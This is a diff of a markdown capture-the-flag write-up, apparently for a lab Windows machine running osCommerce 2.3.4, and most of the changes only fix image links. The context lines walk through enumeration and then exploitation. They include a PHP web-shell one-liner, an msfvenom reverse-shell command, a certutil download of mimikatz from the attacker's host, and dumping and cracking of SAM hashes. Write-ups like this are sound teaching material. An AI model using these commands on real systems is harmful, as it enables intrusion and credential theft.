@@ -93,6 +93,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1705.88 seconds
 let's begin enumeration.
 
 ##Enumeration
+
 we have a couple of ports running on the target  so let's begin with those
  - 80 (http)
  - 135 (msrpc)
@@ -106,14 +107,16 @@ we can navigate to our web browser to check out the web server running on our ta
 
 so on port 80 we have a 404 error.
 
-![[1.png]]
+![image](/posts/res/BP1.png) 
 
-meanwhile on port 443 we seem to have an application running on it ![[2.png]]
+meanwhile on port 443 we seem to have an application running on it 
+![image](/posts/res/BP2.png) 
+
 
 navigating through the following url ```https://10.10.113.71:8080/oscommerce-2.3.4/catalog/``` gives us an eshop website 
 
 
-![[3.png]]
+![image](/posts/res/BP3.png) 
 
 
 so lets try to use gobuster to find and locate any hidden files or directories
@@ -122,10 +125,11 @@ so lets try to use gobuster to find and locate any hidden files or directories
 command used: gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 
 ```
-![[5.png]]
+![image](/posts/res/BP5.png) 
+
 from our directory enumeration we were able to find the installation page for the application.
 
-![[4.png]]
+![image](/posts/res/BH4.png) 
 
 from enumerating the web server we were able to get the following information 
 
@@ -134,6 +138,8 @@ the webserver runs **Oscommerce 2.3.4**
 ```
 
 ##Enumerating SMB 
+
+
 we can try to enumerate smb for useful information by running a simple nmap script.
 
 enumerating shares
@@ -189,7 +195,7 @@ command used: nmap --script=smb-enum-users.nse -p445 blue.thm
 ```
 
 
-![[6.png]]
+![image](/posts/res/BP6.png) 
 
 we can see that we have 3 users available on the target system:
  - Administrator
@@ -200,12 +206,17 @@ we can see that we have 3 users available on the target system:
 ```
  command used: smbclient //<TARGET_IP>/Users
 ```
-![[7.png]]
+
+![image](/posts/res/BP7.png) 
+
 we can download files in the Users shares but cant in the Windows share because of root restrictions this means we cant access the SAM database.
 
 ##Gaining Foothold
+
+
 we can simply search Oscommerce 2.3.4 in our web server to find a trusted exploit.
-![[8.png]]
+
+![image](/posts/res/BP8.png) 
 
 
  If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible  for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page is already installed and does not attempt to do any authentication. It is possible for an attacker to directly execute the "install_4.php" script, which will create the config file for the installation. It is possible to inject PHP code into the config file and then simply executing the code by opening it.
@@ -228,23 +239,23 @@ first we start by adding the php one liner code to a file called shell.php
 `<?php echo shell_exec($_GET["cmd"]); ?>`
 
 
-![[9.png]]
+![image](/posts/res/BP9.png) 
 
 now we've successfully downloaded the shell.php file to the server let's inject command to confirm if tit gives us a web shell 
-![[10.png]]
+![image](/posts/res/BP10.png) 
 command used: 
 ```
 http://10.10.113.71:8080/oscommerce-2.3.4/catalog/install/includes/shell.php?cmd=whoami
 ```
 
-![[11.png]]
+![image](/posts/res/BP11.png) 
 
 Cool!! we are already root. so now the next step is to gain a shell.
 to do this we must create a shell with msfvenom and the apply the same technique we used earlier to send it over to the target machine.
 
 from further enumeration by running the ***systeminfo*** command we can see that the system type is a x86 based PC so we would to use a x86 payload to get a reverse shell.
 
-![[sysinfo.png]]
+![image](/posts/res/sysinfo.png) 
 
 Note: ensure to use a Stageless non-meterpreter payload!!
 
@@ -253,16 +264,17 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86
 ```
 
 
-![[12.png]]
+![image](/posts/res/BP12.png) 
 
 now we edit the exploit script to point over to ***shell.exe*** .
-![[13.png]]
+![image](/posts/res/BP13.png) 
 
 
-![[15.png]]
+![image](/posts/res/BP15.png) 
 
 
-![[14.png]]
+![image](/posts/res/BP14.png)
+
 now we can set up our listener using netcat and execute it.
 
 ```
@@ -275,7 +287,7 @@ execute using the following command: http://10.10.113.71:8080/oscommerce-2.3.4/c
 
 and now we have a shell.
 
-![[16.png]]
+![image](/posts/res/BP16.png) 
 
 now we are asked to get the NTLM Hash of the user. to do this we must transfer mimikatz binary from our local machine unto the server.
 
@@ -287,7 +299,7 @@ in our kali machine we have mimikatz x86 binary available in the following file 
 
 all we need to do is copy the binary file over to our current working directory and then start a simple web server using python.
 
-![[17.png]]
+![image](/posts/res/BP17.png) 
 
 now we start our python web server on our local machine using the following command:
 ```
@@ -301,7 +313,7 @@ certutil -urlcache -split -f http://10.9.215.120:8081/mimikatz.exe mimikatz.exe
 ```
 
 
-![[18.png]]
+![image](/posts/res/BP18.png) 
 
 now we execute it by simply running:
 
@@ -315,9 +327,9 @@ to dump hashes from the SAM database we use the following command:
 lsadump::sam
 ```
 
-![[19.png]]
+![image](/posts/res/BP19.png) 
 
 to crack the hash simply head over to crackstation and input the hash.
 
 now to get root flag 
-![[20.png]]
+![image](/posts/res/BP20.png) 
